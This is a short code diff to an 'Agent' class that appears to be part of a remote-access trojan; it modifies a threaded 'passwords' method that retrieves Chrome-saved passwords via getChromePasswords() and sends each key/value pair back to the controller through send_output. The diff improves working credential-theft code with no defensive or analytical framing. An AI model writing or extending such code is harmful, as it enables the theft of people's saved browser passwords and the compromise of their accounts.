@@ -324,8 +324,9 @@ class Agent(object):
     @threaded
     def passwords(self):
         data = getChromePasswords()
-        for element in data:
-            self.send_output(element)
+        for dictionary in data:
+            for key, value in dictionary.items():
+                self.send_output("%s : %s" % (key, value))
 
 
     def help(self):
